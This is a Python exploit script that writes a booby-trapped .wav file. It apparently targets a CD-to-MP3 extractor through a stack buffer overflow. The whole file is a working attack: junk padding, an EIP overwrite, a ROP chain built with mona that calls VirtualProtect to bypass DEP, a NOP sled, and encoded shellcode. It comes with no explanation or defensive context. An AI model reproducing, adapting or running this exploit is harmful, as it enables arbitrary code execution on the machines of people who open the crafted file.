#!/usr/bin/python

import struct

file = 'cdmp3-rop-mona-1.wav'

total = 8000
junk = 'A' * 4112
eip = struct.pack('<L', 0x1000718B)		# RETN to stack

rop = struct.pack('<L', 0x100023c0)	# POP ECX # RETN [ogg.dll] 
rop+= struct.pack('<L', 0x77c11120)	# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT msvcrt.dll]
rop+= struct.pack('<L', 0x00415f8c)	# MOV EDX,DWORD PTR DS:[ECX] # MOV EAX,EDX # RETN [CDEXTR~1.EXE] 
rop+= struct.pack('<L', 0x004481db)	# PUSH EAX # POP ESI # POP EBX # RETN    ** [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x00456002)	# POP EBP # RETN [CDEXTR~1.EXE] 
rop+= struct.pack('<L', 0x00419d0b)	# & jmp esp [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x00428000)	# POP EBX # RETN [CDEXTR~1.EXE] 
rop+= struct.pack('<L', 0x00000201)	# 0x00000201-> ebx
rop+= struct.pack('<L', 0x00421880)	# POP EDX # RETN [CDEXTR~1.EXE] 
rop+= struct.pack('<L', 0x00000040)	# 0x00000040-> edx
rop+= struct.pack('<L', 0x100023c0)	# POP ECX # RETN [ogg.dll] 
rop+= struct.pack('<L', 0x004dc000)	# &Writable location [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x10004786)	# POP EDI # RETN [ogg.dll] 
rop+= struct.pack('<L', 0x00456003)	# RETN (ROP NOP) [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x00406383)	# POP EAX # RETN [CDEXTR~1.EXE] 
rop+= struct.pack('<L', 0x90909090)	# nop
rop+= struct.pack('<L', 0x004c0634)	# PUSHAD # RETN [CDEXTR~1.EXE] 

nop = '\x90' * 32
shellcode = ("\x89\xe7\xdb\xcd\xd9\x77\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x58\x68\x4e\x69\x47\x70\x43\x30\x45\x50\x43\x50\x4e"
"\x69\x49\x75\x56\x51\x4b\x62\x52\x44\x4c\x4b\x52\x72\x50\x30"
"\x4e\x6b\x43\x62\x56\x6c\x4c\x4b\x56\x32\x54\x54\x4e\x6b\x54"
"\x32\x56\x48\x54\x4f\x4d\x67\x51\x5a\x54\x66\x54\x71\x49\x6f"
"\x50\x31\x49\x50\x4e\x4c\x45\x6c\x51\x71\x51\x6c\x54\x42\x56"
"\x4c\x51\x30\x4f\x31\x5a\x6f\x56\x6d\x47\x71\x5a\x67\x58\x62"
"\x58\x70\x52\x72\x52\x77\x4e\x6b\x50\x52\x56\x70\x4e\x6b\x51"
"\x52\x47\x4c\x43\x31\x4e\x30\x4c\x4b\x47\x30\x52\x58\x4d\x55"
"\x4b\x70\x50\x74\x43\x7a\x56\x61\x5a\x70\x56\x30\x4c\x4b\x47"
"\x38\x56\x78\x4c\x4b\x52\x78\x47\x50\x56\x61\x49\x43\x5a\x43"
"\x47\x4c\x51\x59\x4e\x6b\x50\x34\x4e\x6b\x43\x31\x4b\x66\x45"
"\x61\x49\x6f\x54\x71\x4f\x30\x4c\x6c\x4b\x71\x58\x4f\x56\x6d"
"\x45\x51\x4b\x77\x45\x68\x4d\x30\x52\x55\x5a\x54\x47\x73\x43"
"\x4d\x5a\x58\x45\x6b\x43\x4d\x47\x54\x50\x75\x5a\x42\x43\x68"
"\x4c\x4b\x43\x68\x47\x54\x45\x51\x58\x53\x51\x76\x4e\x6b\x54"
"\x4c\x50\x4b\x4c\x4b\x51\x48\x47\x6c\x43\x31\x58\x53\x4c\x4b"
"\x47\x74\x4e\x6b\x56\x61\x5a\x70\x4d\x59\x51\x54\x54\x64\x45"
"\x74\x51\x4b\x43\x6b\x51\x71\x51\x49\x50\x5a\x43\x61\x49\x6f"
"\x49\x70\x51\x48\x51\x4f\x50\x5a\x4c\x4b\x56\x72\x5a\x4b\x4c"
"\x46\x51\x4d\x51\x7a\x43\x31\x4c\x4d\x4e\x65\x4c\x79\x45\x50"
"\x45\x50\x43\x30\x56\x30\x45\x38\x50\x31\x4c\x4b\x52\x4f\x4e"
"\x67\x49\x6f\x58\x55\x4d\x6b\x58\x70\x58\x35\x4c\x62\x50\x56"
"\x45\x38\x4f\x56\x4f\x65\x4f\x4d\x4d\x4d\x49\x6f\x4e\x35\x45"
"\x6c\x56\x66\x43\x4c\x54\x4a\x4d\x50\x49\x6b\x49\x70\x51\x65"
"\x56\x65\x4d\x6b\x47\x37\x45\x43\x50\x72\x52\x4f\x43\x5a\x45"
"\x50\x52\x73\x4b\x4f\x58\x55\x52\x43\x50\x61\x52\x4c\x45\x33"
"\x43\x30\x41\x41")

sisa = 'C' * 300

payload = junk+eip+rop+nop+shellcode+sisa
f = open(file,'w')
print "Payload size: ", len(payload)
f.write(payload)
print "File",file, "successfully created"
f.close()